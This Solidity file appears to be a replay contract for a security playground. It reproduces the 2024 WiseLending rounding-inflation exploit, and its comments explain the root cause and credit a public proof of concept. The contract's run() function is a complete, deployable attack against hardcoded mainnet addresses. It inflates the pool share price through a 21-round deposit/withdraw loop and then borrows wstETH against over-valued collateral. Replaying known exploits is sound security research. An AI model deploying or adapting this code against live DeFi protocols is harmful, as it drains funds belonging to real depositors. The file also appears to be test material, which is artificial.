// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2024-01-WiseLending02).
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test contract
// (`test_poc()` on `WiseLendingTest`) -- there is no standalone exploit contract to
// deploy. This contract is a faithful, self-contained copy of that inline attack
// (seed -> donate -> withdraw-to-dust -> 21-round rounding-inflation loop -> fund a
// second position -> deposit real collateral -> borrow) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/WiseLending02_exp.sol, with one simplification: the original test moves the
// final "clean" deposit+borrow to a second EOA (`other = vm.addr(123_123)`, purely
// for narrative separation -- WiseLending's NFT-position model has no requirement
// that the manipulation position and the borrowing position be owned by different
// addresses). Here BOTH positions are minted and owned by this same contract, which
// is behaviourally identical (mintPosition()/depositExactAmount()/borrowExactAmount()
// all key off msg.sender-owned NFT ids, not off a specific EOA) and lets the whole
// attack run as one recorded call. `deal(pendleLPT, address(this), 1 ether)` and
// `skip(5 seconds)` (Foundry cheatcodes) are replicated by the config's `setup`
// (dealToken step + blockTimestamp override) -- this contract has no cheatcode calls.
//
// Root cause: WiseLending's lending-share conversion helper rounds DOWN on deposit
// and UP on withdraw-by-amount. On a freshly-emptied pool (totalDepositShares == 1)
// that asymmetry lets the attacker mint exactly 1 share for `2*pseudoTotalPool - 1`
// tokens, then burn that 1 share for just 1 token back -- pumping pseudoTotalPool by
// ~3x per round while `_compareSharePrice` only blocks share-price *decreases*.
// After ~21 rounds the share price is inflated ~9 orders of magnitude, so a
// legitimate-looking deposit into the pool mints a wildly over-valued collateral
// position that can borrow real assets out.

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IPool {
    function depositExactAmount(uint256 _underlyingLpAssetAmount) external returns (uint256, uint256);
}

interface INFTManager {
    function mintPosition() external returns (uint256);
}

interface IWiseLending {
    function depositExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
    function withdrawExactShares(uint256 _nftId, address _poolToken, uint256 _shares) external returns (uint256);
    function withdrawExactAmount(uint256 _nftId, address _poolToken, uint256 _withdrawAmount) external returns (uint256);
    function getPositionLendingShares(uint256 _nftId, address _poolToken) external view returns (uint256);
    function borrowExactAmount(uint256 _nftId, address _poolToken, uint256 _amount) external returns (uint256);
    function lendingPoolData(address _poolToken)
        external
        view
        returns (uint256 pseudoTotalPool, uint256 totalDepositShares, uint256 collateralFactor);
}

interface IWiseSecurity {
    function maximumBorrowToken(uint256 _nftId, address _poolToken, uint256 _interval)
        external
        view
        returns (uint256 tokenAmount);
}

contract WiseLending02Drain {
    IWiseLending public constant wiseLending = IWiseLending(payable(0x37e49bf3749513A02FA535F0CbC383796E8107E4));
    INFTManager public constant nft = INFTManager(0x32E0A7F7C4b1A19594d25bD9b63EBA912b1a5f61);

    // PLP-stETH-Dec2025
    address public constant poolToken = 0xB40b073d7E47986D3A45Ca7Fd30772C25A2AD57f;
    address public constant pendleLPT = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;
    address public constant wsteth = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address public constant wiseSecurity = 0x829c3AE2e82760eCEaD0F384918a650F8a31Ba18;

    uint256 constant MAX = type(uint256).max;

    function run() external {
        // step 0: seed a fresh pool 1:1 (mirrors testExploit's `deal` + deposit).
        IERC20(pendleLPT).approve(poolToken, MAX);
        IPool(poolToken).depositExactAmount(1 ether);

        IERC20(poolToken).approve(address(wiseLending), MAX);

        uint256 nftId = nft.mintPosition();
        wiseLending.depositExactAmount(nftId, poolToken, 1e9);

        // step 1: donate an equal amount directly -- _cleanUp folds it into
        // pseudoTotalPool without minting shares, doubling the share price.
        IERC20(poolToken).transfer(address(wiseLending), 1e9);

        (uint256 pseudoTotalPool, uint256 totalDepositShares,) = wiseLending.lendingPoolData(poolToken);

        // step 2: withdraw everything -- drives the pool to the dust state
        // (pseudoTotalPool = 2, totalDepositShares = 1) where rounding dominates.
        uint256 share = wiseLending.getPositionLendingShares(nftId, poolToken);
        wiseLending.withdrawExactShares(nftId, poolToken, share);

        // step 3: the rounding-inflation loop -- deposit floors shares (mints
        // exactly 1 share for `2*pseudo - 1` tokens), withdraw ceils shares
        // (burns 1 share for 1 token back). pseudoTotalPool triples each round
        // while totalDepositShares stays pinned near 1.
        uint256 i = 0;
        do {
            (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
            share = wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);
            wiseLending.withdrawExactAmount(nftId, poolToken, share);
            ++i;
        } while (i < 20);

        (pseudoTotalPool, totalDepositShares,) = wiseLending.lendingPoolData(poolToken);
        wiseLending.depositExactAmount(nftId, poolToken, pseudoTotalPool * 2 - 1);

        // step 4-5: fund a SECOND position with the remaining pool tokens and
        // deposit them as ordinary-looking collateral against the now-degenerate
        // (massively inflated) share price.
        uint256 otherNftId = nft.mintPosition();
        wiseLending.depositExactAmount(otherNftId, poolToken, IERC20(poolToken).balanceOf(address(this)));

        // step 6: borrow real wstETH against the over-valued collateral.
        uint256 amount = IWiseSecurity(wiseSecurity).maximumBorrowToken(otherNftId, poolToken, 0);
        wiseLending.borrowExactAmount(otherNftId, wsteth, amount);
    }
}
